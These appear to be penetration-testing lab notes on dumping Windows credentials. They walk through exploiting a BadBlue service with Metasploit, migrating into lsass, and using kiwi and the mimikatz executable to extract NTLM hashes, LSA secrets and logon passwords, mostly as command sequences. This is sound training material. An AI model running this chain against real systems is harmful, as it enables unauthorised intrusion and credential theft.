# C - Dumping Hashes with Mimikatz

### **Mimikatz**

* Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
* The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.
* Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
* We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.

> Note: Mimikatz requires elevated privileges in order to run correctly.

### **Practical Demonstration**

#### **Initial Access**

`nmap -sV $ip` - scan for vuln service.

```
# using metasploit to exploit the "BadBlue service"
search badblue
use exploit/windows/http/badblue_passthru
options
set RHOSTS $ip
run
# we get a meterpreter.
sysinfo
getuid
pgrep lsass  # migrate to a 64bit process in this case, the lsass process.
getuid # we have NT AUTHORITY.
```

#### Using Meterpreter Extension \[kiwi]

```bash
# after gaining administrative privileges.
# we can now use the kiwi extension
load kiwi
? # displays the kiwi help commands.
creds_all # dumps all credentials.
lsa_dump_sam #Dump NTLM hashes from the SAM memory.
lsa_dump_secrets #Dump secrets from LSA.
```

#### Using the actual  Mimikatz executable

```bash
# 1
# navigate to the C:\Temp directory from the meterprester session.
# kali already has the mimikatz file in it, so we can directly upload it to the vicim Temp dir.
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe #Upload x64 mimikatz executable onto the target system.

# 2
# open a cmd prompt session
shell
.\mimikatz.exe #Launch mimikatz within the target system.

# 3
# Check if current user has the privileges required to use mimikatz.
privilege::debug # if it tells you [Privilege '20' OK] then you are good to go.

# 4
lsadump::sam # Dump NTLM hashes and other info from the SAM memory.
lsadump::secrets # Dump secrets from the LSA.
sekurlsa::logonpasswords # Reveal clear-text passwords that the system might have stored.
# but the system has been configured correctly, we cant find any clear text password.

```

